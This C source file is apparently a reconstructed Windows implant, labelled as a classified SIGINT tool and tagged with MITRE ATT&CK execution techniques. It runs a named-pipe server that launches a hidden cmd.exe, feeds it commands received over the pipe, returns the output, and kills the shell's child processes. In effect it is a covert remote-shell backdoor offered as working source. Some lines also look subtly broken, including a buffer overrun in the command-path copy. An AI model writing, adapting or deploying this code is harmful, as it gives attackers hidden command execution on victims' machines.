/*
 * 🛡️ C4ISR-STRATCOM: SIGINT-V5
 * [CLASSIFIED]: CONFIDENCIAL
 * [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
 * [TACTIC]: TA0002_Execution
 * [TECHNIQUE]: T1059_Command_and_Scripting_Interpreter
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma pack(push, 4)

typedef struct _PIPE_MSG_HEADER {
    DWORD command;
    DWORD salt;
    DWORD payloadSize;
} PIPE_MSG_HEADER;

typedef struct _CMD_CONTEXT {
    DWORD  magicId;
    DWORD  salt;
    DWORD  payloadSize;
    HANDLE hPipe1;
    HANDLE hPipe2;
    HANDLE hProcess;
    DWORD  dwProcessId;
} CMD_CONTEXT;

#pragma pack(pop)

#define PIPE_NAME          L"\\\\.\\pipe\\pipename_isudbvvws"
#define CMD_START_PROCESS  3
#define CMD_READ_OUTPUT    4
#define CMD_STOP_PROCESS   5

#define MAGIC_STARTED      0x10
#define MAGIC_READ         0x11
#define MAGIC_STOPPED      0x12
#define MAGIC_ERROR        0x01

#define CP_UTF8            65001

#define PROMPT_STRING      "prompt $Cprompt$B$L$F$Qflag$G\r\n"
#define PROMPT_LENGTH      0x1F

#define CMD_PATH_PART      "C:\\Windows\\System32\\cmd."
#define CMD_PATH_EXT       "exe"

#define OUTPUT_DRAIN_SIZE  0x400
#define PIPE_BUFFER_SIZE   0x40000
#define PROCESS_ALL_ACCESS 0x1FFFFF

#define CRLF_BYTES         "\r\n"

typedef struct _DSO_STRING {
    union {
        CHAR  inlineBuf[16];
        CHAR *heapBuf;
    };
    SIZE_T length;
    SIZE_T capacity;
} DSO_STRING;

static void DsoString_Init(DSO_STRING *s)
{
    memset(s->inlineBuf, 0, sizeof(s->inlineBuf));
    s->length = 0;
    s->capacity = 15;
}

static CHAR *DsoString_Data(DSO_STRING *s)
{
    return (s->capacity > 15) ? s->heapBuf : s->inlineBuf;
}

static void DsoString_Assign(DSO_STRING *dst, const CHAR *src, SIZE_T count)
{
    SIZE_T curCap = dst->capacity;

    if (count <= curCap) {
        CHAR *buf = (curCap <= 15) ? dst->inlineBuf : dst->heapBuf;
        memmove(buf, src, count);
        buf[count] = '\0';
        dst->length = count;
        return;
    }

    if (count > (SIZE_T)0x7FFFFFFFFFFFFFFF) {
        return;
    }

    SIZE_T newCap = count | 0xF;
    SIZE_T growCap = (count + (curCap >> 1)) & (SIZE_T)0x7FFFFFFFFFFFFFFF;
    if (newCap < growCap) {
        newCap = growCap;
    }

    CHAR *newBuf = (CHAR *)malloc(newCap + 1);
    if (!newBuf) return;

    memcpy(newBuf, src, count);
    newBuf[count] = '\0';

    if (curCap > 15) {
        free(dst->heapBuf);
    }

    dst->heapBuf = newBuf;
    dst->length = count;
    dst->capacity = newCap;
}

static void DsoString_Copy(DSO_STRING *dst, const DSO_STRING *src)
{
    if (src->length > 0) {
        DsoString_Assign(dst, DsoString_Data((DSO_STRING *)src), src->length);
    } else {
        dst->inlineBuf[0] = '\0';
        dst->length = 0;
    }
}

static void DsoString_Destroy(DSO_STRING *s)
{
    if (s->capacity > 15) {
        free(s->heapBuf);
    }
    s->heapBuf = NULL;
    s->length = 0;
    s->capacity = 15;
    s->inlineBuf[0] = '\0';
}

static void *SafeNew(SIZE_T size)
{
    void *p;
    do {
        p = malloc(size);
        if (p) return p;
    } while (_callnewh(size));
    return NULL;
}

static void ConvertUtf8ToAnsi(DSO_STRING *out, DSO_STRING *in)
{
    CHAR *srcPtr = DsoString_Data(in);
    int srcLen = (int)in->length;

    int wLen = MultiByteToWideChar(CP_UTF8, 0, srcPtr, srcLen, NULL, 0);
    WCHAR *wBuf = (WCHAR *)SafeNew((SIZE_T)(wLen + 1) * sizeof(WCHAR));
    if (!wBuf) return;

    MultiByteToWideChar(CP_UTF8, 0, srcPtr, srcLen, wBuf, wLen);
    wBuf[wLen] = L'\0';

    UINT acp = GetACP();
    int wStrLen = 0;
    while (wBuf[wStrLen]) wStrLen++;

    int mbLen = WideCharToMultiByte(acp, 0, wBuf, wStrLen, NULL, 0, NULL, NULL);
    CHAR *mbBuf = (CHAR *)SafeNew((SIZE_T)(mbLen + 1));
    if (!mbBuf) { free(wBuf); return; }

    WideCharToMultiByte(acp, 0, wBuf, wStrLen, mbBuf, mbLen, NULL, NULL);
    mbBuf[mbLen] = '\0';

    DsoString_Assign(out, mbBuf, (SIZE_T)mbLen);
    free(mbBuf);
    free(wBuf);

    DsoString_Destroy(in);
}

static void ConvertAnsiToUtf8(DSO_STRING *out, DSO_STRING *in)
{
    CHAR *srcPtr = DsoString_Data(in);
    int srcLen = (int)in->length;

    UINT acp = GetACP();
    int wLen = MultiByteToWideChar(acp, 0, srcPtr, srcLen, NULL, 0);
    WCHAR *wBuf = (WCHAR *)SafeNew((SIZE_T)(wLen + 1) * sizeof(WCHAR));
    if (!wBuf) return;

    MultiByteToWideChar(acp, 0, srcPtr, srcLen, wBuf, wLen);
    wBuf[wLen] = L'\0';

    int wStrLen = 0;
    while (wBuf[wStrLen]) wStrLen++;

    int u8Len = WideCharToMultiByte(CP_UTF8, 0, wBuf, wStrLen, NULL, 0, NULL, NULL);
    CHAR *u8Buf = (CHAR *)SafeNew((SIZE_T)(u8Len + 1));
    if (!u8Buf) { free(wBuf); return; }

    WideCharToMultiByte(CP_UTF8, 0, wBuf, wStrLen, u8Buf, u8Len, NULL, NULL);
    u8Buf[u8Len] = '\0';

    DsoString_Assign(out, u8Buf, (SIZE_T)u8Len);
    free(u8Buf);
    free(wBuf);

    DsoString_Destroy(in);
}

static void *BuildErrorReply(int *replySize)
{
    DWORD *buf = (DWORD *)malloc(0x10);
    if (!buf) { *replySize = 0; return NULL; }
    buf[0] = MAGIC_ERROR;
    buf[1] = (DWORD)rand();
    buf[2] = 4;
    buf[3] = 0;
    *replySize = 0x10;
    return buf;
}

static void TerminateChildProcesses(DWORD parentPid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ParentProcessID == parentPid &&
                _wcsicmp(pe.szExeFile, L"conhost.exe") != 0) {
                HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (h) {
                    TerminateProcess(h, 0);
                    CloseHandle(h);
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

static void *ExecuteCommand(BYTE *msg, int *replySize)
{
    DSO_STRING cmdUtf8, cmdWorking, cmdAnsi;
    CHAR cmdPathBuffer[24];
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    HANDLE hStdinRead, hStdinWrite, hStdoutRead, hStdoutWrite;
    DWORD cmdLen, bytesWritten, bytesRead;
    CHAR *ansiPtr;
    SIZE_T ansiLen;
    BOOL ok;
    void *response;

    DsoString_Init(&cmdUtf8);
    DsoString_Init(&cmdWorking);
    DsoString_Init(&cmdAnsi);

    cmdLen = *(DWORD *)(msg + 0x28);
    DsoString_Assign(&cmdUtf8, (CHAR *)(msg + 0x2C), cmdLen - 1);

    DsoString_Copy(&cmdWorking, &cmdUtf8);
    ConvertUtf8ToAnsi(&cmdAnsi, &cmdWorking);

    if (*(LONG64 *)(msg + 0x0C) != 0) {
        DWORD pid = *(DWORD *)(msg + 0x24);
        HANDLE hWrite = *(HANDLE *)(msg + 0x0C);

        TerminateChildProcesses(pid);

        ansiPtr = DsoString_Data(&cmdAnsi);
        ansiLen = cmdAnsi.length;

        bytesWritten = 0;
        ok = WriteFile(hWrite, ansiPtr, (DWORD)ansiLen, &bytesWritten, NULL);

        if (ok && bytesWritten == cmdLen - 1) {
            CMD_CONTEXT *ctx = (CMD_CONTEXT *)malloc(sizeof(CMD_CONTEXT));
            if (ctx) {
                ctx->magicId = MAGIC_STARTED;
                ctx->salt = (DWORD)rand();
                ctx->payloadSize = (DWORD)(sizeof(CMD_CONTEXT) - sizeof(PIPE_MSG_HEADER));
                ctx->hPipe1 = *(HANDLE *)(msg + 0x14);
                ctx->hPipe2 = *(HANDLE *)(msg + 0x0C);
                ctx->hProcess = *(HANDLE *)(msg + 0x1C);
                ctx->dwProcessId = *(DWORD *)(msg + 0x24);
                *replySize = (int)sizeof(CMD_CONTEXT);
                DsoString_Destroy(&cmdUtf8);
                DsoString_Destroy(&cmdAnsi);
                return ctx;
            }
        }

        response = BuildErrorReply(replySize);
        DsoString_Destroy(&cmdUtf8);
        DsoString_Destroy(&cmdAnsi);
        return response;
    }

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) {
        response = BuildErrorReply(replySize);
        DsoString_Destroy(&cmdUtf8);
        DsoString_Destroy(&cmdAnsi);
        return response;
    }

    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
        CloseHandle(hStdinRead);
        CloseHandle(hStdinWrite);
        response = BuildErrorReply(replySize);
        DsoString_Destroy(&cmdUtf8);
        DsoString_Destroy(&cmdAnsi);
        return response;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hStdinRead;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;
    si.wShowWindow = SW_HIDE;

    memset(cmdPathBuffer, 0, sizeof(cmdPathBuffer));
    memcpy(cmdPathBuffer, CMD_PATH_PART, 0x18);
    memcpy(cmdPathBuffer + 0x18, CMD_PATH_EXT, 4);

    ok = CreateProcessA(NULL, cmdPathBuffer, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) {
        CloseHandle(hStdinRead);
        CloseHandle(hStdinWrite);
        CloseHandle(hStdoutRead);
        CloseHandle(hStdoutWrite);
        response = BuildErrorReply(replySize);
        DsoString_Destroy(&cmdUtf8);
        DsoString_Destroy(&cmdAnsi);
        return response;
    }

    CloseHandle(pi.hThread);

    bytesWritten = 0;
    WriteFile(hStdinWrite, PROMPT_STRING, PROMPT_LENGTH, &bytesWritten, NULL);

    Sleep(100);

    {
        void *drain = SafeNew(OUTPUT_DRAIN_SIZE);
        if (drain) {
            ReadFile(hStdoutRead, drain, OUTPUT_DRAIN_SIZE, &bytesRead, NULL);
            free(drain);
        }
    }

    bytesWritten = 0;
    WriteFile(hStdinWrite, CRLF_BYTES, 2, &bytesWritten, NULL);

    ansiPtr = DsoString_Data(&cmdAnsi);
    ansiLen = cmdAnsi.length;

    bytesWritten = 0;
    ok = WriteFile(hStdinWrite, ansiPtr, (DWORD)ansiLen, &bytesWritten, NULL);

    if (ok && bytesWritten == cmdLen - 1) {
        CMD_CONTEXT *ctx = (CMD_CONTEXT *)malloc(sizeof(CMD_CONTEXT));
        if (ctx) {
            ctx->magicId = MAGIC_STARTED;
            ctx->salt = (DWORD)rand();
            ctx->payloadSize = (DWORD)(sizeof(CMD_CONTEXT) - sizeof(PIPE_MSG_HEADER));
            ctx->hPipe1 = hStdoutRead;
            ctx->hPipe2 = hStdinWrite;
            ctx->hProcess = pi.hProcess;
            ctx->dwProcessId = pi.dwProcessId;
            *replySize = (int)sizeof(CMD_CONTEXT);
            DsoString_Destroy(&cmdUtf8);
            DsoString_Destroy(&cmdAnsi);
            return ctx;
        }
    }

    CloseHandle(pi.hProcess);
    CloseHandle(hStdinRead);
    CloseHandle(hStdinWrite);
    CloseHandle(hStdoutRead);
    CloseHandle(hStdoutWrite);

    response = BuildErrorReply(replySize);
    DsoString_Destroy(&cmdUtf8);
    DsoString_Destroy(&cmdAnsi);
    return response;
}

static void *ReadCommandOutput(BYTE *msg, int *replySize)
{
    HANDLE hPipe = *(HANDLE *)(msg + 0x0C);
    DWORD avail = 0;
    BOOL ok;
    void *response;

    ok = PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL);
    if (!ok) return BuildErrorReply(replySize);

    if (avail == 0) {
        DWORD *buf = (DWORD *)malloc(0x10);
        if (!buf) return BuildErrorReply(replySize);
        buf[0] = MAGIC_READ;
        buf[1] = (DWORD)rand();
        buf[2] = 4;
        buf[3] = 0;
        *replySize = 0x10;
        return buf;
    }

    void *rawBuf = SafeNew(avail);
    if (!rawBuf) return BuildErrorReply(replySize);

    DWORD bytesRead = 0;
    ok = ReadFile(hPipe, rawBuf, avail, &bytesRead, NULL);
    if (!ok) {
        free(rawBuf);
        return BuildErrorReply(replySize);
    }

    DSO_STRING rawStr, ansiCopy, utf8Str;
    DsoString_Init(&rawStr);
    DsoString_Init(&ansiCopy);
    DsoString_Init(&utf8Str);

    if (bytesRead > 0) {
        DsoString_Assign(&rawStr, (CHAR *)rawBuf, bytesRead);
    }
    free(rawBuf);

    CHAR *rawPtr = DsoString_Data(&rawStr);
    if (rawStr.length > 0) {
        DsoString_Assign(&ansiCopy, rawPtr, rawStr.length);
    }

    ConvertAnsiToUtf8(&utf8Str, &ansiCopy);

    SIZE_T dataLen = utf8Str.length;
    int totalSz = (int)dataLen + 0x11;

    response = malloc(totalSz);
    if (!response) {
        DsoString_Destroy(&rawStr);
        DsoString_Destroy(&utf8Str);
        return BuildErrorReply(replySize);
    }

    memset(response, 0, (SIZE_T)totalSz);
    DWORD *d = (DWORD *)response;
    d[0] = MAGIC_READ;
    d[1] = (DWORD)rand();
    d[2] = (DWORD)(totalSz - 0x0C);
    d[3] = (DWORD)(dataLen + 1);

    if (dataLen > 0) {
        memcpy((BYTE *)response + 0x10, DsoString_Data(&utf8Str), dataLen);
    }

    *replySize = totalSz;

    DsoString_Destroy(&rawStr);
    DsoString_Destroy(&utf8Str);
    return response;
}

static DWORD WINAPI HandlePipeConnection(HANDLE hPipe)
{
    PIPE_MSG_HEADER hdr;
    DWORD bytesRead = 0, bytesWritten = 0;
    BYTE *fullMsg;
    void *response = NULL;
    int replySize = 0;
    BOOL ok;

    hdr.command = 0;
    hdr.salt = (DWORD)rand();
    hdr.payloadSize = 0;

    ok = ReadFile(hPipe, &hdr, sizeof(PIPE_MSG_HEADER), &bytesRead, NULL);
    if (!ok || bytesRead != sizeof(PIPE_MSG_HEADER)) return 0;

    fullMsg = (BYTE *)malloc(sizeof(PIPE_MSG_HEADER) + hdr.payloadSize);
    if (!fullMsg) return 0;

    memcpy(fullMsg, &hdr, sizeof(PIPE_MSG_HEADER));

    ok = ReadFile(hPipe, fullMsg + sizeof(PIPE_MSG_HEADER), hdr.payloadSize,
                  &bytesRead, NULL);
    if (!ok || bytesRead != hdr.payloadSize) {
        free(fullMsg);
        return 0;
    }

    switch (hdr.command) {
        case CMD_START_PROCESS:
            response = ExecuteCommand(fullMsg, &replySize);
            break;

        case CMD_READ_OUTPUT:
            response = ReadCommandOutput(fullMsg, &replySize);
            break;

        case CMD_STOP_PROCESS: {
            HANDLE h1 = *(HANDLE *)(fullMsg + 0x0C);
            HANDLE h2 = *(HANDLE *)(fullMsg + 0x14);
            HANDLE hp = *(HANDLE *)(fullMsg + 0x1C);

            if (h2) CloseHandle(h2);
            if (h1) CloseHandle(h1);
            if (hp) {
                TerminateProcess(hp, 0);
                CloseHandle(hp);
            }

            response = malloc(0x10);
            if (response) {
                DWORD *d = (DWORD *)response;
                d[0] = MAGIC_STOPPED;
                d[1] = (DWORD)rand();
                d[2] = 4;
                d[3] = 0;
            }
            replySize = 0x10;
            break;
        }

        default:
            free(fullMsg);
            return 0;
    }

    if (response) {
        WriteFile(hPipe, response, (DWORD)replySize, &bytesWritten, NULL);
        FlushFileBuffers(hPipe);
        free(response);
    }

    Sleep(100);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    free(fullMsg);
    return 0;
}

static void __declspec(noreturn) PipeServerMain(void)
{
    HANDLE hPipe, hThread;
    DWORD tid;

    for (;;) {
        do {
            Sleep(10);
            hPipe = CreateNamedPipeW(
                PIPE_NAME,
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
                PIPE_UNLIMITED_INSTANCES,
                PIPE_BUFFER_SIZE,
                PIPE_BUFFER_SIZE,
                0,
                NULL
            );
        } while (hPipe == INVALID_HANDLE_VALUE);

        BOOL conn = ConnectNamedPipe(hPipe, NULL);
        if (!conn && GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(hPipe);
            continue;
        }

        tid = 0;
        hThread = CreateThread(NULL, 0, HandlePipeConnection, hPipe, 0, &tid);
        if (hThread) CloseHandle(hThread);
    }
}

void entry(void)
{
    PipeServerMain();
}
